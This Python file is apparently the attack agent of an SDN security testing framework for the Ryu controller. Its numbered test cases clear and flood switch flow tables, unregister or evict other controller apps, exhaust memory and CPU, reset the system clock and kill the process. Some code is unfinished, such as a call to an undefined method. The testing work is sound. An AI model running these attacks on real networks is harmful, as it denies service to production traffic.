from threading import Thread
from ryu.base import app_manager
from am_interface import AMInterface
from ryu.controller import ofp_event
from ryu.controller.handler import CONFIG_DISPATCHER, MAIN_DISPATCHER
from ryu.controller.handler import set_ev_cls
from ryu.lib.packet import packet
from ryu.lib.packet import ethernet
from ryu.controller import dpset
from ryu.ofproto import ofproto_v1_3
import sys, os
import array
import itertools

class AppAgent13(app_manager.RyuApp):
    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]
    _CONTEXTS = {
        'dpset': dpset.DPSet
    }

    def __init__(self, *args, **kwargs):
        super(AppAgent13, self).__init__(*args, **kwargs)
        self.dpset = kwargs['dpset']
        self.drop = 0
        self.clear = 0
        self.msg = None

        # Run AMInterface Thread
        ami = AMInterface(self, self.logger)
        server_address = ami.setServerAddr()
        t = Thread(target=ami.connectServer, args=(server_address,))
        t.start()
        self.logger.info("[App-Agent] Starting AppAgent on Ryu")

    # 3.1.020
    # TODO: N/A
    def testControlMessageDrop(self):
        self.logger.info("[ATTACK] Start Control Message Drop")
        return "[AppAgent] N/A"

    # 3.1.030
    def testInfiniteLoops(self):
        self.logger.info("[ATTACK] Start Infinite Loop")
        self.callInfiniteLoops()

    # Start Loop
    def callInfiniteLoops(self):
        i = 0

        while i < 32767:
            i = i + 1

            if i == 32766:
                i = 0

    # 3.1.040
    # TODO: N/A
    def testInternalStorageAbuse(self):
        self.logger.info("[ATTACK] Start Internal Storage Abuse")
        del self.dpset.dps
        return "[AppAgent] N/A"

    # 3.1.070
    def testFlowRuleModification(self):
        self.logger.info("[ATTACK] Start Flow Rule Modification")

        for dp in self.dpset.dps.values():
            match = dp.ofproto_parser.OFPMatch()
            actions = []
            inst = [dp.ofproto_parser.OFPInstructionActions(dp.ofproto.OFPIT_APPLY_ACTIONS, actions)]
            flow_mod = dp.ofproto_parser.OFPFlowMod(datapath=dp, match=match, cookie=0,
                                                    out_port=dp.ofproto.OFPP_ANY,
                                                    out_group=dp.ofproto.OFPG_ANY,
                                                    instructions=inst,
                                                    command=dp.ofproto.OFPFC_MODIFY)
            dp.send_msg(flow_mod)
            self.logger.info("[App-Agent] Sending a OF FlowMod message '%s' to switch '%s'" % (str(flow_mod), str(dp.id)))

        result = "success|" + str(flow_mod)
        return result

    # 3.1.080
    def testFlowTableClearance(self):
        self.logger.info("[ATTACK] Start Flow Table Clearance")
        self.callFlowTableClearance()
        self.clear = 1

    def callFlowTableClearance(self):
        for dp in self.dpset.dps.values():
            match = dp.ofproto_parser.OFPMatch()
            flow_mod = dp.ofproto_parser.OFPFlowMod(datapath=dp, match=match, cookie=0,
                                                    out_port=dp.ofproto.OFPP_ANY,

                                                    out_group=dp.ofproto.OFPG_ANY,
                                                    command=dp.ofproto.OFPFC_DELETE)
            dp.send_msg(flow_mod)

    # 3.1.090
    def testEventListenerUnsubscription(self):
        self.logger.info("[ATTACK] Event Listener Unsubscription")
        app_name = "SimpleSwitch13"
        app_mgr = app_manager.AppManager.get_instance()
        ev_c, state_c = app_mgr.applications[app_name].events.get()
        handlers = app_mgr.applications[app_name].get_handlers(ev_c, state_c)
        for handler in handlers:
            if "_packet_in_handler" in str(handler):
                app_mgr.applications[app_name].unregister_handler(ofp_event.EventOFPPacketIn, handler)
        return "EventOFPPacketIn Message"

    # 3.1.100
    def testApplicationEviction(self):
        self.logger.info("[ATTACK] Application Eviction")
        app_name = "SimpleSwitch13"
        app_mgr = app_manager.AppManager.get_instance()
        app_mgr.uninstantiate(app_name)
        return app_name

    # 3.1.110
    # TODO: this result is pass. why?, My test result is fail.
    def testMemoryExhaustion(self):
        self.logger.info("[ATTACK] Memory Exhaustion")
        array.array('B', itertools.repeat(0, sys.maxint))

    # 3.1.120
    def testCPUExhaustion(self):
        self.logger.info("[ATTACK] CPU Exhaustion")
        for i in range(0, 10000):
            t = Thread(target=self.CPUThread)
            t.start()

    # dummy thread
    def CPUThread(self):
        x = 0
        while True:
            x = x + 1

    # 3.1.130
    # TODO: permission
    def testSystemVariableManipulation(self):
        self.logger.info("[ATTACK] System Variable Manipulation")
        os.system("date -s '1 JAN 1999'")

    # 3.1.140
    def testSystemCommandExecution(self):
        self.logger.info("[ATTACK] System Command Execution")
        sys.exit(1)

    # 3.1.190
    def testFlowRuleFlooding(self):
        self.logger.info("[ATTACK] Flow Rule Flooding")
        for dp in self.dpset.dps.values():
            count = 10
            while count < 25000:
                match = dp.ofproto_parser.OFPMatch(eth_dst=count)
                flow_mod = dp.ofproto_parser.OFPFlowMod(datapath=dp,
                                                        match=match)
                dp.send_msg(flow_mod)
                count = count + 1

    # 3.1.200
    # TODO: X, Ryu process to install rules with MAC address
    def testSwitchFirmwareMisuse(self):
        self.logger.info("[ATTACK] Switch Firmware Misuse")
        return "[AppAgent] X"

    # 2.1.060
    def testUnFlaggedFlowRemoveMsgNotification(self):
        return "PASS"

    @set_ev_cls(ofp_event.EventOFPPacketIn, MAIN_DISPATCHER)
    def packetIn_handler(self, ev):
        self.msg = ev.msg

        if self.drop:
            self.callControlMessageDrop()
        if self.clear:
            self.callFlowTableClearance()

if __name__ == "__main__":
    a = AppAgent13()